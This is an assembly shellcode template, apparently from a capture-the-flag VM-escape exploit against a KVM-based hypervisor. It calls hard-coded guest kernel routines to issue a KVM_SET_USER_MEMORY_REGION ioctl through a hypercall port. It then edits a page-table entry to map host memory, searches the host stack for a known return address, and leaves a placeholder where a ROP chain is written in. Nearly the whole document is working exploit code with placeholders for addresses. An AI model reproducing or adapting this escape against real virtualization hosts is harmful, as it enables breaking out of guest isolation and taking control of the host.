mov r15, 0xDC2 /* vmcall_read */
mov r14, 0xE8A /* vmcall_write */
mov r13, 0xE7E /* vmcall_open */
mov r12, 0xEE6 /* vmcall_lseek */
mov r11, 0x3731383036323931

call self
self:
pop r10

push r11
call print_qword

/* ioctl KVM_SET_USER_MEMORY_REGION */

sub rsp, 0x20
mov rax, 1
mov [rsp], rax
mov rax, 0x2000000
mov [rsp+0x8], rax
mov rax, 0x21000
mov [rsp+0x10], rax
mov rax, {:#x}
mov [rsp+0x18], rax
mov rdi, 4
mov rsi, 0x4020AE46
mov rdx, rsp
call vmcall_ioctl

/* Set page table for 0x2000000 */

mov rax, cr3
lea rdx, [rax+0x4080]
mov rcx, 0x2000000
or cl, 0x83
mov [rdx], rcx

xor rdi, rdi
xor rsi, rsi
call vmcall_ioctl

/* Search the whole stack for return address */

mov r12, 0x8002000000
add r12, 0x21000
mov rcx, {:#x}
loop:
sub r12, 0x8
mov rbx, [r12]
cmp rbx, rcx
jnz loop

/* Put rop chain on the stack */

{chain_code}

hlt

print_qword:
push rsi
lea rsi, [rsp + 16]
mov rdx, 8
mov rdi, 1
mov rax, 1
call r14
pop rsi
ret 8

/* 0x1183 : remove_bit */
/* 0xE72 : in_and_out */
/* 0x15E0 : kmalloc */
/* 0x1577 : kfree */
/* 0x1538 : init_allocator */
vmcall_ioctl:
push r13
push r12
mov r13, rsi
push rbp
push rbx
mov r12, rdx
movsxd rbp, edi
xor esi, esi
mov edi, 0x18
sub rsp, 0x18
mov rax, 0x15E0
call rax
mov [rax], rbp
mov [rax+8], r13
mov rdi, rax
mov [rax+0x10], r12
mov rbx, rax
mov rax, 0x1183
call rax
mov edi, 0x8008  /* ioctl port */
mov esi, eax
mov rax, 0xE72
call rax
mov rdi, rbx
mov [rsp+0x38-0x2C], eax
mov rax, 0x1577
call rax
mov eax, [rsp+0x38-0x2C]
add rsp, 0x18
pop rbx
pop rbp
pop r12
pop r13
ret 8
